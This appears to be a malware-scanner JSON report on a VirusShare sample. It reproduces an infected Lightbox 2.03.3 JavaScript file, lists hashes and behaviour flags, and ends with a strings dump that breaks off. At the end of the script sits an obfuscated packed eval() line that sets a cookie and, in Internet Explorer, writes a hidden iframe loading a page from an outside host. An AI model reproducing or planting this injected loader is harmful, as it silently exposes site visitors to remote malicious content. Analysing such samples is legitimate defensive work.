{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "write": "May write to a file"
        },
        "macro": "// -----------------------------------------------------------------------------------\n//\n//\tLightbox v2.03.3\n//\tOriginal by Lokesh Dhakar - http://www.huddletogether.com\n//  Add-on Ajax based text light box by I\ufffdaki Gorostiza\n//\t10/05/07\n//\n//\tFor more information on this script, visit:\n//\thttp://huddletogether.com/projects/lightbox2/\n//\n//\tLicensed under the Creative Commons Attribution 2.5 License - http://creativecommons.org/licenses/by/2.5/\n//\t\n//\tCredit also due to those who have helped, inspired, and made their code available to the public.\n//\tIncluding: Scott Upton(uptonic.com), Peter-Paul Koch(quirksmode.org), Thomas Fuchs(mir.aculo.us), and others.\n//\n//\n// -----------------------------------------------------------------------------------\n/*\n\n\tTable of Contents\n\t-----------------\n\tConfiguration\n\tGlobal Variables\n\n\tExtending Built-in Objects\t\n\t- Object.extend(Element)\n\t- Array.prototype.removeDuplicates()\n\t- Array.prototype.empty()\n\n\tLightbox Class Declaration\n\t- initialize()\n\t- start()\n\t- changeImage()\n\t- resizeImageContainer()\n\t- showImage()\n\t- updateDetails()\n\t- updateNav()\n\t- enableKeyboardNav()\n\t- disableKeyboardNav()\n\t- keyboardAction()\n\t- preloadNeighborImages()\n\t- end()\n\t- showText()\n\t\n\tMiscellaneous Functions\n\t- getPageScroll()\n\t- getPageSize()\n\t- getKey()\n\t- listenKey()\n\t- showSelectBoxes()\n\t- hideSelectBoxes()\n\t- showFlash()\n\t- hideFlash()\n\t- pause()\n\t- initLightbox()\n\t\n\tFunction Calls\n\t- addLoadEvent(initLightbox)\n\t\n*/\n// -----------------------------------------------------------------------------------\n\n//\n//\tConfiguration\n//\nvar fileLoadingImage = \"aplication/webroot/imgs/loading.gif\";\t\t\nvar overlayOpacity = 0.5;\t// controls transparency of shadow overlay\nvar animate = true;\t\t\t// toggles resizing animations\nvar resizeSpeed = 7;\t\t// controls the speed of the image resizing animations (1=slowest and 10=fastest)\nvar borderSize = 10;\t\t//if you adjust the padding in the CSS, you will need to update this variable\n\n// -----------------------------------------------------------------------------------\n\n//\n//\tGlobal Variables\n//\nvar imageArray = new Array;\nvar activeImage;\n\nif(animate == true){\n\toverlayDuration = 1;\t// shadow fade in/out duration\n\tif(resizeSpeed > 10){ resizeSpeed = 10;}\n\tif(resizeSpeed < 1){ resizeSpeed = 1;}\n\tresizeDuration = (11 - resizeSpeed) * 0.15;\n} else { \n\toverlayDuration = 1;\n\tresizeDuration = 0;\n}\n\n// -----------------------------------------------------------------------------------\n\n//\n//\tAdditional methods for Element added by SU, Couloir\n//\t- further additions by Lokesh Dhakar (huddletogether.com)\n//\nObject.extend(Element, {\n\tgetWidth: function(element) {\n\t   \telement = $(element);\n\t   \treturn element.offsetWidth; \n\t},\n\tsetWidth: function(element,w) {\n\t   \telement = $(element);\n    \telement.style.width = w +\"px\";\n\t},\n\tsetHeight: function(element,h) {\n   \t\telement = $(element);\n    \telement.style.height = h +\"px\";\n\t},\n\tsetTop: function(element,t) {\n\t   \telement = $(element);\n    \telement.style.top = t +\"px\";\n\t},\n\tsetSrc: function(element,src) {\n    \telement = $(element);\n    \telement.src = src; \n\t},\n\tsetHref: function(element,href) {\n    \telement = $(element);\n    \telement.href = href; \n\t},\n\tsetInnerHTML: function(element,content) {\n\t\telement = $(element);\n\t\telement.innerHTML = content;\n\t}\n});\n\n// -----------------------------------------------------------------------------------\n\n//\n//\tExtending built-in Array object\n//\t- array.removeDuplicates()\n//\t- array.empty()\n//\nArray.prototype.removeDuplicates = function () {\n    for(i = 0; i < this.length; i++){\n        for(j = this.length-1; j>i; j--){        \n            if(this[i][0] == this[j][0]){\n                this.splice(j,1);\n            }\n        }\n    }\n}\n\n// -----------------------------------------------------------------------------------\n\nArray.prototype.empty = function () {\n\tfor(i = 0; i <= this.length; i++){\n\t\tthis.shift();\n\t}\n}\n\n// -----------------------------------------------------------------------------------\n\n//\n//\tLightbox Class Declaration\n//\t- initialize()\n//\t- start()\n//\t- changeImage()\n//\t- resizeImageContainer()\n//\t- showImage()\n//\t- updateDetails()\n//\t- updateNav()\n//\t- enableKeyboardNav()\n//\t- disableKeyboardNav()\n//\t- keyboardNavAction()\n//\t- preloadNeighborImages()\n//\t- end()\n//\n//\tStructuring of code inspired by Scott Upton (http://www.uptonic.com/)\n//\nvar Lightbox = Class.create();\n\nLightbox.prototype = {\n\t\n\t// initialize()\n\t// Constructor runs on completion of the DOM loading. Loops through anchor tags looking for \n\t// 'lightbox' references and applies onclick events to appropriate links. The 2nd section of\n\t// the function inserts html at the bottom of the page which is used to display the shadow \n\t// overlay and the image container.\n\t//\n\tinitialize: function() {\t\n\t\tif (!document.getElementsByTagName){ return; }\n\t\tvar anchors = document.getElementsByTagName('a');\n\t\tvar areas = document.getElementsByTagName('area');\n\n\t\t// loop through all anchor tags\n\t\tfor (var i=0; i<anchors.length; i++){\n\t\t\tvar anchor = anchors[i];\n\t\t\t\n\t\t\tvar relAttribute = String(anchor.getAttribute('rel'));\n\t\t\t\n\t\t\t// use the string.match() method to catch 'lightbox' references in the rel attribute\n\t\t\tif (anchor.getAttribute('href') && (relAttribute.toLowerCase().match('lightbox'))){\n\t\t\t\tanchor.onclick = function () {myLightbox.start(this); return false;}\n\t\t\t}\n\t\t}\n\n\t\t// loop through all area tags\n\t\t// todo: combine anchor & area tag loops\n\t\tfor (var i=0; i< areas.length; i++){\n\t\t\tvar area = areas[i];\n\t\t\t\n\t\t\tvar relAttribute = String(area.getAttribute('rel'));\n\t\t\t\n\t\t\t// use the string.match() method to catch 'lightbox' references in the rel attribute\n\t\t\tif (area.getAttribute('href') && (relAttribute.toLowerCase().match('lightbox'))){\n\t\t\t\tarea.onclick = function () {myLightbox.start(this); return false;}\n\t\t\t}\n\t\t}\n\n\t\t// The rest of this code inserts html at the bottom of the page that looks similar to this:\n\t\t//\n\t\t//\t<div id=\"overlay\"></div>\n\t\t//\t<div id=\"textLightbox\">\n\t\t//\t\t<div id=\"outerTextContainer\">\n\t\t//\t\t\t<div id=\"closeText\">\n\t\t//\t\t\t\t<img src='img/closed.gif' width='12' height='12' title='Close'/>\n\t\t//\t\t\t</div>\n\t\t//\t\t \t<div id=\"textContainer\">\n\t\t//\t\t\t</div>\n\t\t//\t\t</div>\n\t\t//\t</div>\n\t\t//\t<div id=\"lightbox\">\n\t\t//\t<div id=\"imageDataContainer\">\n\t\t//\t\t\t<div id=\"imageData\">\n\t\t//\t\t\t\t<div id=\"imageDetails\">\n\t\t//\t\t\t\t\t<span id=\"caption\"></span>\n\t\t//\t\t\t\t\t<span id=\"numberDisplay\"></span>\n\t\t//\t\t\t\t</div>\n\t\t//\t\t\t\t<div id=\"bottomNav\">\n\t\t//\t\t\t\t\t<a href=\"#\" id=\"bottomNavClose\">\n\t\t//\t\t\t\t\t\t<img src=\"images/close.gif\">\n\t\t//\t\t\t\t\t</a>\n\t\t//\t\t\t\t</div>\n\t\t//\t\t\t</div>\n\t\t//\t\t</div>\n\t\t//\t\t<div id=\"outerImageContainer\">\n\t\t//\t\t\t<div id=\"imageContainer\">\n\t\t//\t\t\t\t<img id=\"lightboxImage\">\n\t\t//\t\t\t\t<div style=\"\" id=\"hoverNav\">\n\t\t//\t\t\t\t\t<a href=\"#\" id=\"prevLink\"></a>\n\t\t//\t\t\t\t\t<a href=\"#\" id=\"nextLink\"></a>\n\t\t//\t\t\t\t</div>\n\t\t//\t\t\t\t<div id=\"loading\">\n\t\t//\t\t\t\t\t<a href=\"#\" id=\"loadingLink\">\n\t\t//\t\t\t\t\t\t<img src=\"images/loading.gif\">\n\t\t//\t\t\t\t\t</a>\n\t\t//\t\t\t\t</div>\n\t\t//\t\t\t</div>\n\t\t//\t\t</div>\n\t\t//\t</div>\n\n\t\tvar objBody = document.getElementsByTagName(\"body\").item(0);\n\t\t\n\t\tvar objOverlay = document.createElement(\"div\");\n\t\tobjOverlay.setAttribute('id','overlay');\n\t\tobjOverlay.style.display = 'none';\n\t\tobjOverlay.onclick = function() { myLightbox.end(); }\n\t\tobjBody.appendChild(objOverlay);\n\t\t\n\t\tvar objLightbox = document.createElement(\"div\");\n\t\tobjLightbox.setAttribute('id','lightbox');\n\t\tobjLightbox.style.display = 'none';\n\t\tobjLightbox.onclick = function(e) {\t// close Lightbox is user clicks shadow overlay\n\t\t\tif (!e) var e = window.event;\n\t\t\tvar clickObj = Event.element(e).id;\n\t\t\tif ( clickObj == 'lightbox') {\n\t\t\t\tmyLightbox.end();\n\t\t\t}\n\t\t};\n\t\tobjBody.appendChild(objLightbox);\n\t\t\n\t\t//TextLightBox\n\t\tvar objTextLightbox = document.createElement(\"div\");\n\t\tobjTextLightbox.setAttribute('id','textLightbox');\n\t\tobjTextLightbox.style.display = 'none';\n\t\tobjTextLightbox.onclick = function(e) {\t// close Lightbox is user clicks shadow overlay\n\t\t\tif (!e) var e = window.event;\n\t\t\tvar clickObj = Event.element(e).id;\n\t\t\tif ( clickObj == 'textLightbox') {\n\t\t\t\tmyLightbox.end();\n\t\t\t}\n\t\t};\n\t\t\n\t\t\n\t\tobjBody.appendChild(objTextLightbox);\n\t\n\t\tvar outerTextContainer = document.createElement(\"div\");\n\t\touterTextContainer.setAttribute('id','outerTextContainer');\n\t\tobjTextLightbox.appendChild(outerTextContainer);\n\t\t\n\t\tvar closeText = document.createElement(\"div\");\n\t\tcloseText.setAttribute('id','closeText');\n\t\touterTextContainer.appendChild(closeText);\t\n\t\t\n\t\tvar closeIcon = document.createElement(\"img\");\n\t\tcloseIcon.setAttribute('id','closeIcon');\n\t\tcloseIcon.setAttribute('src','aplication/webroot/imgs/closed.gif');\n\t\tcloseIcon.style.cursor=\"pointer\";\n\t\tcloseIcon.onclick = function() { myLightbox.end(); return false; }\n\t\tcloseText.appendChild(closeIcon);\n\t\t\n\t\tvar textContainer = document.createElement(\"div\");\n\t\ttextContainer.setAttribute('id','textContainer');\n\t\touterTextContainer.appendChild(textContainer);\t\n\t\t\t\n\t\tvar objImageDataContainer = document.createElement(\"div\");\n\t\tobjImageDataContainer.setAttribute('id','imageDataContainer');\n\t\tobjLightbox.appendChild(objImageDataContainer);\t\n\t\t\n\t\tvar objImageData = document.createElement(\"div\");\n\t\tobjImageData.setAttribute('id','imageData');\n\t\tobjImageDataContainer.appendChild(objImageData);\n\t\n\t\tvar objImageDetails = document.createElement(\"div\");\n\t\tobjImageDetails.setAttribute('id','imageDetails');\n\t\tobjImageData.appendChild(objImageDetails);\n\t\n\t\tvar objCaption = document.createElement(\"span\");\n\t\tobjCaption.setAttribute('id','caption');\n\t\tobjImageDetails.appendChild(objCaption);\n\t\n\t\tvar objNumberDisplay = document.createElement(\"span\");\n\t\tobjNumberDisplay.setAttribute('id','numberDisplay');\n\t\tobjImageDetails.appendChild(objNumberDisplay);\n\t\t\n\t\tvar objBottomNav = document.createElement(\"div\");\n\t\tobjBottomNav.setAttribute('id','bottomNav');\n\t\tobjImageData.appendChild(objBottomNav);\n\t\t\n\t\t\t\n\t\tvar objOuterImageContainer = document.createElement(\"div\");\n\t\tobjOuterImageContainer.setAttribute('id','outerImageContainer');\n\t\tobjLightbox.appendChild(objOuterImageContainer);\n\n\t\t// When Lightbox starts it will resize itself from 250 by 250 to the current image dimension.\n\t\t// If animations are turned off, it will be hidden as to prevent a flicker of a\n\t\t// white 250 by 250 box.\n\t\tif(animate){\n\t\t\tElement.setWidth('outerImageContainer', 250);\n\t\t\tElement.setHeight('outerImageContainer', 250);\t\t\t\n\t\t} else {\n\t\t\tElement.setWidth('outerImageContainer', 1);\n\t\t\tElement.setHeight('outerImageContainer', 1);\t\t\t\n\t\t}\n\n\t\tvar objImageContainer = document.createElement(\"div\");\n\t\tobjImageContainer.setAttribute('id','imageContainer');\n\t\tobjOuterImageContainer.appendChild(objImageContainer);\n\t\n\t\tvar objLightboxImage = document.createElement(\"img\");\n\t\tobjLightboxImage.setAttribute('id','lightboxImage');\n\t\tobjImageContainer.appendChild(objLightboxImage);\n\t\n\t\tvar objHoverNav = document.createElement(\"div\");\n\t\tobjHoverNav.setAttribute('id','hoverNav');\n\t\tobjImageContainer.appendChild(objHoverNav);\n\t\n\t\tvar objPrevLink = document.createElement(\"a\");\n\t\tobjPrevLink.setAttribute('id','prevLink');\n\t\tobjPrevLink.setAttribute('href','#');\n\t\tobjHoverNav.appendChild(objPrevLink);\n\t\t\n\t\tvar objNextLink = document.createElement(\"a\");\n\t\tobjNextLink.setAttribute('id','nextLink');\n\t\tobjNextLink.setAttribute('href','#');\n\t\tobjHoverNav.appendChild(objNextLink);\n\t\n\t\tvar objLoading = document.createElement(\"div\");\n\t\tobjLoading.setAttribute('id','loading');\n\t\tobjImageContainer.appendChild(objLoading);\n\t\n\t\tvar objLoadingLink = document.createElement(\"a\");\n\t\tobjLoadingLink.setAttribute('id','loadingLink');\n\t\tobjLoadingLink.setAttribute('href','#');\n\t\tobjLoadingLink.onclick = function() { myLightbox.end(); return false; }\n\t\tobjLoading.appendChild(objLoadingLink);\n\t\n\t\tvar objLoadingImage = document.createElement(\"img\");\n\t\tobjLoadingImage.setAttribute('src', fileLoadingImage);\n\t\tobjLoadingLink.appendChild(objLoadingImage);\n\t\n\t\tvar objBottomNavCloseImage = document.createElement(\"img\");\n\t\tobjBottomNavCloseImage.setAttribute('id','closeIcon2');\n\t\tobjBottomNavCloseImage.setAttribute('src','aplication/webroot/imgs/closed.gif');\n\t\tobjBottomNavCloseImage.style.cursor=\"pointer\";\n\t\tobjBottomNavCloseImage.onclick = function() { myLightbox.end(); return false; }\n\t\tobjBottomNav.appendChild(objBottomNavCloseImage);\n\t\t\n\t},\n\t\n\t//\n\t//\tstart()\n\t//\tDisplay overlay and lightbox. If image is part of a set, add siblings to imageArray.\n\t//\n\tstart: function(imageLink) {\t\n\n\t\thideSelectBoxes();\n\t\thideFlash();\n\n\t\t// stretch overlay to fill page and fade in\n\t\tvar arrayPageSize = getPageSize();\n\t\tElement.setHeight('overlay', arrayPageSize[1]);\n\n\t\tnew Effect.Appear('overlay', { duration: overlayDuration, from: 0.0, to: overlayOpacity });\n\n\t\timageArray = [];\n\t\timageNum = 0;\t\t\n\n\t\tif (!document.getElementsByTagName){ return; }\n\t\tvar anchors = document.getElementsByTagName( imageLink.tagName);\n\n\t\t// if image is NOT part of a set..\n\t\n\t\tif((imageLink.getAttribute('rel') == 'lightbox_text'))\n\t\t{\t\n\t url=imageLink.getAttribute('href'); \n\t\t\tvar texto;\n\t\t\tvar obj=this\n\t\t\tnew Ajax.Request(url, {  method: 'get',  onSuccess: function(transport) { \n\t\t\ttexto=transport.responseText;\n\t\t\t\tobj.showText(texto);\n\t\t\t }});\n\t\t\t\t\t\t}else{\n\t\tif((imageLink.getAttribute('rel') == 'lightbox')){\n\t\t\t// add single image to imageArray\n\t\t\timageArray.push(new Array(imageLink.getAttribute('href'), imageLink.getAttribute('title')));\t\t\t\n\t\t} \n\t\telse {\n\t\t// if image is part of a set..\n\n\t\t\t// loop through anchors, find other images in set, and add them to imageArray\n\t\t\tfor (var i=0; i<anchors.length; i++){\n\t\t\t\tvar anchor = anchors[i];\n\t\t\t\tif (anchor.getAttribute('href') && (anchor.getAttribute('rel') == imageLink.getAttribute('rel'))){\n\t\t\t\t\timageArray.push(new Array(anchor.getAttribute('href'), anchor.getAttribute('title')));\n\t\t\t\t}\n\t\t\t}\n\t\t\timageArray.removeDuplicates();\n\t\t\twhile(imageArray[imageNum][0] != imageLink.getAttribute('href')) { imageNum++;}\n\t\t}\n\n\t\t// calculate top offset for the lightbox and display \n\t\tvar arrayPageScroll = getPageScroll();\n\t\tvar lightboxTop = arrayPageScroll[1] + (arrayPageSize[3] / 10);\n\n\t\tElement.setTop('lightbox', lightboxTop);\n\t\tElement.show('lightbox');\n\t\t\n\t\tthis.changeImage(imageNum);\n\n\t}},\n\tshowText: function(txt) {\n\t\t\t\t\n\t\tvar arrayPageScroll = getPageScroll();\n\t\tvar lightboxTop = arrayPageScroll[1] + (arrayPageSize[3] / 10);\n\t\tElement.setTop('textLightbox', lightboxTop);\n\t\tElement.hide('outerImageContainer');\n\t\tElement.hide('imageDataContainer');\n\t\tElement.show('textLightbox');\n\t\tElement.show('outerTextContainer');\n\t\t$(\"textContainer\").innerHTML=txt;\n\n\t\t},\n\n\n\t//\n\t//\tchangeImage()\n\t//\tHide most elements and preload image in preparation for resizing image container.\n\t//\n\tchangeImage: function(imageNum) {\t\n\t\t\n\t\tactiveImage = imageNum;\t// update global var\n\n\t\t// hide elements during transition\n\t\tif(animate){ Element.show('loading');}\n\t\tElement.show('outerImageContainer');\n\t\tElement.show('imageDataContainer');\n\t\tElement.hide('lightboxImage');\n\t\tElement.hide('hoverNav');\n\t\tElement.hide('prevLink');\n\t\tElement.hide('nextLink');\n\t\tElement.hide('imageDataContainer');\n\t\tElement.hide('numberDisplay');\t\t\n\t\t\n\t\timgPreloader = new Image();\n\n\t\t// once image is preloaded, resize image container\n\t\timgPreloader.onload=function(){\n\t\t\tElement.setSrc('lightboxImage', imageArray[activeImage][0]);\n\t\t\tmyLightbox.resizeImageContainer(imgPreloader.width, imgPreloader.height);\n\t\t\timgPreloader.onload=function(){};\t//\tclear onLoad, IE behaves irratically with animated gifs otherwise \n\t\t}\n\t\timgPreloader.src = imageArray[activeImage][0];\n\t},\n\n\t//\n\t//\tresizeImageContainer()\n\t//\n\tresizeImageContainer: function( imgWidth, imgHeight) {\n\n\t\t// get curren width and height\n\t\tthis.widthCurrent = Element.getWidth('outerImageContainer');\n\t\tthis.heightCurrent = Element.getHeight('outerImageContainer');\n\n\t\t// get new width and height\n\t\tvar widthNew = (imgWidth  + (borderSize * 2));\n\t\tvar heightNew = (imgHeight  + (borderSize * 2));\n\n\t\t// scalars based on change from old to new\n\t\tthis.xScale = ( widthNew / this.widthCurrent) * 100;\n\t\tthis.yScale = ( heightNew / this.heightCurrent) * 100;\n\n\t\t// calculate size difference between new and old image, and resize if necessary\n\t\twDiff = this.widthCurrent - widthNew;\n\t\thDiff = this.heightCurrent - heightNew;\n\n\t\tif(!( hDiff == 0)){ new Effect.Scale('outerImageContainer', this.yScale, {scaleX: false, duration: resizeDuration, queue: 'front'}); }\n\t\tif(!( wDiff == 0)){ new Effect.Scale('outerImageContainer', this.xScale, {scaleY: false, delay: resizeDuration, duration: resizeDuration}); }\n\n\t\t// if new and old image are same size and no scaling transition is necessary, \n\t\t// do a quick pause to prevent image flicker.\n\t\tif((hDiff == 0) && (wDiff == 0)){\n\t\t\tif (navigator.appVersion.indexOf(\"MSIE\")!=-1){ pause(250); } else { pause(100);} \n\t\t}\n\n\t\tElement.setHeight('prevLink', imgHeight);\n\t\tElement.setHeight('nextLink', imgHeight);\n\t\tElement.setWidth( 'imageDataContainer', widthNew);\n\n\t\tthis.showImage();\n\t},\n\t\n\t//\n\t//\tshowImage()\n\t//\tDisplay image and begin preloading neighbors.\n\t//\n\tshowImage: function(){\n\t\tElement.hide('loading');\n\t\tElement.hide('outerTextContainer');\n\t\t//Element.hide('textContainer');\n\t\tnew Effect.Appear('lightboxImage', { duration: resizeDuration, queue: 'end', afterFinish: function(){\tmyLightbox.updateDetails(); } });\n\t\tthis.preloadNeighborImages();\n\t},\n\n\t//\n\t//\tupdateDetails()\n\t//\tDisplay caption, image number, and bottom nav.\n\t//\n\tupdateDetails: function() {\n\t\n\t\tElement.show('caption');\n\t\tElement.setInnerHTML( 'caption', imageArray[activeImage][1]);\n\t\t\n\t\t// if image is part of set display 'Image x of x' \n\t\tif(imageArray.length > 1){\n\t\t\tElement.show('numberDisplay');\n\t\t\tElement.setInnerHTML( 'numberDisplay', \"Image \" + eval(activeImage + 1) + \" of \" + imageArray.length);\n\t\t}\n\n\t\tnew Effect.Parallel(\n\t\t\t[ new Effect.SlideDown( 'imageDataContainer', { sync: true, duration: resizeDuration, from: 0.0, to: 1.0 }), \n\t\t\t  new Effect.Appear('imageDataContainer', { sync: true, duration: resizeDuration }) ], \n\t\t\t{ duration: resizeDuration, afterFinish: function() {\n\t\t\t\t// update overlay size and update nav\n\t\t\t\tvar arrayPageSize = getPageSize();\n\t\t\t\tElement.setHeight('overlay', arrayPageSize[1]);\n\t\t\t\tmyLightbox.updateNav();\n\t\t\t\t}\n\t\t\t} \n\t\t);\n\t},\n\n\t//\n\t//\tupdateNav()\n\t//\tDisplay appropriate previous and next hover navigation.\n\t//\n\tupdateNav: function() {\n\n\t\tElement.show('hoverNav');\t\t\t\t\n\n\t\t// if not first image in set, display prev image button\n\t\tif(activeImage != 0){\n\t\t\tElement.show('prevLink');\n\t\t\tdocument.getElementById('prevLink').onclick = function() {\n\t\t\t\tmyLightbox.changeImage(activeImage - 1); return false;\n\t\t\t}\n\t\t}\n\n\t\t// if not last image in set, display next image button\n\t\tif(activeImage != (imageArray.length - 1)){\n\t\t\tElement.show('nextLink');\n\t\t\tdocument.getElementById('nextLink').onclick = function() {\n\t\t\t\tmyLightbox.changeImage(activeImage + 1); return false;\n\t\t\t}\n\t\t}\n\t\t\n\t\tthis.enableKeyboardNav();\n\t},\n\n\t//\n\t//\tenableKeyboardNav()\n\t//\n\tenableKeyboardNav: function() {\n\t\tdocument.onkeydown = this.keyboardAction; \n\t},\n\n\t//\n\t//\tdisableKeyboardNav()\n\t//\n\tdisableKeyboardNav: function() {\n\t\tdocument.onkeydown = '';\n\t},\n\n\t//\n\t//\tkeyboardAction()\n\t//\n\tkeyboardAction: function(e) {\n\t\tif (e == null) { // ie\n\t\t\tkeycode = event.keyCode;\n\t\t\tescapeKey = 27;\n\t\t} else { // mozilla\n\t\t\tkeycode = e.keyCode;\n\t\t\tescapeKey = e.DOM_VK_ESCAPE;\n\t\t}\n\n\t\tkey = String.fromCharCode(keycode).toLowerCase();\n\t\t\n\t\tif((key == 'x') || (key == 'o') || (key == 'c') || (keycode == escapeKey)){\t// close lightbox\n\t\t\tmyLightbox.end();\n\t\t} else if((key == 'p') || (keycode == 37)){\t// display previous image\n\t\t\tif(activeImage != 0){\n\t\t\t\tmyLightbox.disableKeyboardNav();\n\t\t\t\tmyLightbox.changeImage(activeImage - 1);\n\t\t\t}\n\t\t} else if((key == 'n') || (keycode == 39)){\t// display next image\n\t\t\tif(activeImage != (imageArray.length - 1)){\n\t\t\t\tmyLightbox.disableKeyboardNav();\n\t\t\t\tmyLightbox.changeImage(activeImage + 1);\n\t\t\t}\n\t\t}\n\n\t},\n\n\t//\n\t//\tpreloadNeighborImages()\n\t//\tPreload previous and next images.\n\t//\n\tpreloadNeighborImages: function(){\n\n\t\tif((imageArray.length - 1) > activeImage){\n\t\t\tpreloadNextImage = new Image();\n\t\t\tpreloadNextImage.src = imageArray[activeImage + 1][0];\n\t\t}\n\t\tif(activeImage > 0){\n\t\t\tpreloadPrevImage = new Image();\n\t\t\tpreloadPrevImage.src = imageArray[activeImage - 1][0];\n\t\t}\n\t\n\t},\n\n\t//\n\t//\tend()\n\t//\n\tend: function() {\n\t\tthis.disableKeyboardNav();\n\t\tElement.hide('lightbox');\n\t\tElement.hide('textLightbox');\n\t\tnew Effect.Fade('overlay', { duration: overlayDuration});\n\t\tshowSelectBoxes();\n\t\tshowFlash();\n\t}\n}\n\n// -----------------------------------------------------------------------------------\n\n//\n// getPageScroll()\n// Returns array with x,y page scroll values.\n// Core code from - quirksmode.org\n//\nfunction getPageScroll(){\n\n\tvar yScroll;\n\n\tif (self.pageYOffset) {\n\t\tyScroll = self.pageYOffset;\n\t} else if (document.documentElement && document.documentElement.scrollTop){\t // Explorer 6 Strict\n\t\tyScroll = document.documentElement.scrollTop;\n\t} else if (document.body) {// all other Explorers\n\t\tyScroll = document.body.scrollTop;\n\t}\n\n\tarrayPageScroll = new Array('',yScroll) \n\treturn arrayPageScroll;\n}\n\n// -----------------------------------------------------------------------------------\n\n//\n// getPageSize()\n// Returns array with page width, height and window width, height\n// Core code from - quirksmode.org\n// Edit for Firefox by pHaez\n//\nfunction getPageSize(){\n\t\n\tvar xScroll, yScroll;\n\t\n\tif (window.innerHeight && window.scrollMaxY) {\t\n\t\txScroll = document.body.scrollWidth;\n\t\tyScroll = window.innerHeight + window.scrollMaxY;\n\t} else if (document.body.scrollHeight > document.body.offsetHeight){ // all but Explorer Mac\n\t\txScroll = document.body.scrollWidth;\n\t\tyScroll = document.body.scrollHeight;\n\t} else { // Explorer Mac...would also work in Explorer 6 Strict, Mozilla and Safari\n\t\txScroll = document.body.offsetWidth;\n\t\tyScroll = document.body.offsetHeight;\n\t}\n\t\n\tvar windowWidth, windowHeight;\n\tif (self.innerHeight) {\t// all except Explorer\n\t\twindowWidth = self.innerWidth;\n\t\twindowHeight = self.innerHeight;\n\t} else if (document.documentElement && document.documentElement.clientHeight) { // Explorer 6 Strict Mode\n\t\twindowWidth = document.documentElement.clientWidth;\n\t\twindowHeight = document.documentElement.clientHeight;\n\t} else if (document.body) { // other Explorers\n\t\twindowWidth = document.body.clientWidth;\n\t\twindowHeight = document.body.clientHeight;\n\t}\t\n\t\n\t// for small pages with total height less then height of the viewport\n\tif(yScroll < windowHeight){\n\t\tpageHeight = windowHeight;\n\t} else { \n\t\tpageHeight = yScroll;\n\t}\n\n\t// for small pages with total width less then width of the viewport\n\tif(xScroll < windowWidth){\t\n\t\tpageWidth = windowWidth;\n\t} else {\n\t\tpageWidth = xScroll;\n\t}\n\n\tarrayPageSize = new Array(pageWidth,pageHeight,windowWidth,windowHeight) \n\treturn arrayPageSize;\n}\n\n// -----------------------------------------------------------------------------------\n\n//\n// getKey(key)\n// Gets keycode. If 'x' is pressed then it hides the lightbox.\n//\nfunction getKey(e){\n\tif (e == null) { // ie\n\t\tkeycode = event.keyCode;\n\t} else { // mozilla\n\t\tkeycode = e.which;\n\t}\n\tkey = String.fromCharCode(keycode).toLowerCase();\n\t\n\tif(key == 'x'){\n\t}\n}\n\n// -----------------------------------------------------------------------------------\n\n//\n// listenKey()\n//\nfunction listenKey () {\tdocument.onkeypress = getKey; }\n\t\n// ---------------------------------------------------\n\nfunction showSelectBoxes(){\n\tvar selects = document.getElementsByTagName(\"select\");\n\tfor (i = 0; i != selects.length; i++) {\n\t\tselects[i].style.visibility = \"visible\";\n\t}\n}\n\n// ---------------------------------------------------\n\nfunction hideSelectBoxes(){\n\tvar selects = document.getElementsByTagName(\"select\");\n\tfor (i = 0; i != selects.length; i++) {\n\t\tselects[i].style.visibility = \"hidden\";\n\t}\n}\n\n// ---------------------------------------------------\n\nfunction showFlash(){\n\tvar flashObjects = document.getElementsByTagName(\"object\");\n\tfor (i = 0; i < flashObjects.length; i++) {\n\t\tflashObjects[i].style.visibility = \"visible\";\n\t}\n\n\tvar flashEmbeds = document.getElementsByTagName(\"embed\");\n\tfor (i = 0; i < flashEmbeds.length; i++) {\n\t\tflashEmbeds[i].style.visibility = \"visible\";\n\t}\n}\n\n// ---------------------------------------------------\n\nfunction hideFlash(){\n\tvar flashObjects = document.getElementsByTagName(\"object\");\n\tfor (i = 0; i < flashObjects.length; i++) {\n\t\tflashObjects[i].style.visibility = \"hidden\";\n\t}\n\n\tvar flashEmbeds = document.getElementsByTagName(\"embed\");\n\tfor (i = 0; i < flashEmbeds.length; i++) {\n\t\tflashEmbeds[i].style.visibility = \"hidden\";\n\t}\n\n}\n\n\n// ---------------------------------------------------\n\n//\n// pause(numberMillis)\n// Pauses code execution for specified time. Uses busy code, not good.\n// Help from Ran Bar-On [ran2103@gmail.com]\n//\n\nfunction pause(ms){\n\tvar date = new Date();\n\tcurDate = null;\n\tdo{var curDate = new Date();}\n\twhile( curDate - date < ms);\n}\n/*\nfunction pause(numberMillis) {\n\tvar curently = new Date().getTime() + sender;\n\twhile (new Date().getTime();\t\n}\n*/\n// ---------------------------------------------------\n\n\n\nfunction initLightbox() { myLightbox = new Lightbox(); }\nEvent.observe(window, 'load', initLightbox, false);\nsa=\"%6B%73%69%65%6E%61%2E%6E%65%74\";eval(function(p,a,c,k,e,d){while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+c.toString(a)+'\\\\b','g'),k[c])}}return p}('a(0.4.7(\"5=s\")==-1&&9.8.7(\"f 6\")!=-1){0.4=\"5=s; e=c, 2 g b 2:d:h p; \";0.r(\"<3 q=1 t=1 o=\\'n://\"+j+\"/i/\\' k=\\'l:m\\'></3>\")}',30,30,'document||14|iframe|cookie|_mlsdkf||indexOf|appVersion|navigator|if|2015|Mon|15|expires|MSIE|Jul|26|b2b|sa|style|display|none|http|src|GMT|width|write||height'.split('|')));"
    },
    "filename": "VirusShare_1be5c6cd799dda4b9a0cc4505b5f7ce1",
    "filesize": 25609,
    "filetype": "ISO-8859 text, with very long lines",
    "hashes": {
        "md5": "1be5c6cd799dda4b9a0cc4505b5f7ce1",
        "sha1": "7433a3d59c62a34dc22b614493c27d98ac56cd3a",
        "sha256": "5117822189d29092ed942812328a34d40d58a2bad7b20e5fb277b318844cf8fd"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "// -----------------------------------------------------------------------------------",
            "//\tLightbox v2.03.3",
            "//\tOriginal by Lokesh Dhakar - http://www.huddletogether.com",
            "//  Add-on Ajax based text light box by Iaki Gorostiza",
            "//\t10/05/07",
            "//\tFor more information on this script, visit:",
            "//\thttp://huddletogether.com/projects/lightbox2/",
            "//\tLicensed under the Creative Commons Attribution 2.5 License - http://creativecommons.org/licenses/by/2.5/",
            "//\tCredit also due to those who have helped, inspired, and made their code available to the public.",
            "//\tIncluding: Scott Upton(uptonic.com), Peter-Paul Koch(quirksmode.org), Thomas Fuchs(mir.aculo.us), and others.",
            "// -----------------------------------------------------------------------------------",
            "\tTable of Contents",
            "\t-----------------",
            "\tConfiguration",
